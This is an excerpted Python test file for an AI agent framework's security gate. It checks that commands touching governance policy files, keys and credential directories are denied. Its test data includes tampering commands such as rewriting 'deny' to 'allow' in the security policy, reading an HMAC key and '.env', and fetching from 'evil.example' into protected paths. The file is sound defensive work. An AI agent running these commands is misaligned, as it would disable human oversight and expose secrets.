...
from codex_crew.hooks import TOOL_DENY, HookManager, validate_file_path
from codex_crew.platform.context import PlatformCompositionError
from codex_crew.platform.governance import assert_governance_paths_protected
...
# prefix (current ``~/.codex-crew``, the archived rollback copy, and the pre-move
# legacy ``~/.codexcrew``), so pin both the new default and the still-gated legacy
# location.
_GOV_FILES = (
    "~/.codex-crew/security_policy.json",
    "~/.codex-crew/profiles/app-deploy-web.json",
    "~/.codex-crew/admission_policy.json",
    "~/.codexcrew/security_policy.json",
    "~/.codexcrew/profiles/app-deploy-web.json",
    "~/.codexcrew/admission_policy.json",
)
...
def test_profiles_dir_and_children_blocked():
    assert security.is_sensitive_path("~/.codex-crew/profiles")
    assert security.is_sensitive_path("~/.codex-crew/profiles/anything.json")
    assert security.is_sensitive_path("~/.codex-crew/profiles/nested/deep.json")
    # Legacy pre-move home is still gated.
    assert security.is_sensitive_path("~/.codexcrew/profiles")
    assert security.is_sensitive_path("~/.codexcrew/profiles/anything.json")
    assert security.is_sensitive_path("~/.codexcrew/profiles/nested/deep.json")
...
def test_non_governance_crew_paths_still_readable():
    ...
    assert not security.is_sensitive_path("~/.codex-crew/sessions.db")
    assert not security.is_sensitive_path("~/.codex-crew/config.json")
    assert not security.is_sensitive_path("~/.codexcrew/sessions.db")
    assert not security.is_sensitive_path("~/.codexcrew/config.json")
...
def test_agent_fs_write_to_policy_denied_at_gate():
    ...
    result = hooks.on_tool_call(f"{home}/.codex-crew/security_policy.json")
...
_RUN_EXEC_PATHS = (
    "~/.codexcrew/run",
    "~/.codexcrew/run/gateway-7781.bin",
    "~/.codexcrew/run/codexcrew_sandbox_abc.py",
)
...
def test_agent_fs_write_to_run_marker_denied_at_gate():
    hooks = HookManager()
    home = os.path.expanduser("~")
    result = hooks.on_tool_call(f"{home}/.codexcrew/run/gateway-7781.bin")
    assert result.action == TOOL_DENY
...
@pytest.mark.parametrize(
    "cmd",
    [
        "tee ~/.codex-crew/security_policy.json",
        "mv /tmp/evil.json ~/.codex-crew/security_policy.json",
        "sed -i s/deny/allow/ ~/.codex-crew/security_policy.json",
        "ln -sf /tmp/evil ~/.codex-crew/profiles/app.json",
        "truncate -s0 ~/.codex-crew/admission_policy.json",
        # Legacy pre-move home is still gated.
        "tee ~/.codexcrew/security_policy.json",
        "mv /tmp/evil.json ~/.codexcrew/security_policy.json",
    ],
)
...
_HOME_VAR_SPELLING = "$HOME/.codex-crew/./live_target.json"

_KEYSTONE_SPELLINGS = (
    "~/.codex-crew/live_target.json",
    "~/.codex-crew/./live_target.json",
    "~/.codex-crew/profiles/../live_target.json",
    _HOME_VAR_SPELLING,
    "~/.codex-crew//live_target.json",
    "~/.codex-crew/./security_policy.json",
    "~/.codex-crew/./sel_hmac.key",
    "~/.codexcrew/./security_policy.json",
)
...
def test_key_value_operands_are_resolved_not_skipped():
    ...
    for cmd in (
        "dd if=/dev/zero of=~/.codex-crew/./live_target.json",
        "curl --output=~/.codex-crew/./live_target.json http://evil.example",
        "tar --file=~/.codex-crew/./security_policy.json -x",
    ):
...
def test_benign_key_value_and_dot_segment_commands_not_overblocked():
    for cmd in (
        ...
        "cat ~/.codex-crew/./config.json",  # non-keystone leaf, dot segment
        "ls ~/.codex-crew/./sessions.db",
...
def test_attached_redirections_blocked():
    ...
    for cmd in (
        "printf x >~/.codex-crew/./live_target.json",
        "echo x >>~/.codex-crew/./live_target.json",
        "echo x 2>~/.codex-crew/./live_target.json",
        "echo x 2>>~/.codex-crew/./security_policy.json",
        "printf x >~/.codex-crew/./sel_hmac.key",
        # Input redirections
        "cat <~/.codex-crew/./.env",
        "wc <~/.codex-crew/./sel_hmac.key",
        "sort <~/.codex-crew/./security_policy.json",
    ):
        assert security.is_sensitive_bash_command(cmd) is not None, cmd
...
def test_home_var_expansion_survives_windows_backslashes(monkeypatch):
    ...
    tokens = normalize_shell_command("cat $HOME/.codex-crew/live_target.json")
    assert tokens[0] == "cat"
    ...
    assert ".codex-crew/live_target.json" in tokens[1]


@pytest.mark.parametrize(
    "cmd",
    [
        "git checkout -- ~/.codex-crew/security_policy.json",
        "git restore ~/.codex-crew/security_policy.json",
        "cp evil /home/someuser/.codex-crew/security_policy.json",
        "unzip evil.zip -d ~/.codex-crew/profiles/",
        "tar -xf evil.tar -C ~/.codex-crew/",
        "tar xzf x -C /home/u/.codex-crew/",
        "curl x | tar xf - -C ~/.aws",
        # Legacy pre-move home is still gated.
        "cp evil /home/someuser/.codexcrew/security_policy.json",
        "tar -xf evil.tar -C ~/.codexcrew/",
    ],
)
...
_BROWSER_KEYSTONE = (
    "~/.codex-crew/browser-mode-enabled",
    "~/.codex-crew/browser-engine",
    "~/.codexcrew/browser-mode-enabled",
)
...
@pytest.mark.parametrize(
    ...
    [
        ...
        "touch ~/.codex-crew/browser-mode-enabled",
        "echo x > ~/.codex-crew/browser-mode-enabled",
        "tee ~/.codex-crew/browser-mode-enabled",
        "echo firefox > ~/.codex-crew/browser-engine",
    ],
)
...
def test_benign_archive_and_vcs_not_overblocked():
    for cmd in [
        ...
        "git commit -m 'update'",
        "tar -cf out.tar ~/.codex-crew/sessions.db",  # reading a non-sensitive crew file
...
def test_case_variant_policy_path_is_sensitive():
    ...
    assert security.is_sensitive_path("~/.codex-crew/Security_Policy.json")
    assert security.is_sensitive_path("~/.KIRO/CREW/profiles/x.json")
    # Legacy pre-move home is still gated.
    assert security.is_sensitive_path("~/.codexcrew/Security_Policy.json")
    assert security.is_sensitive_path("~/.CODEXCREW/profiles/x.json")
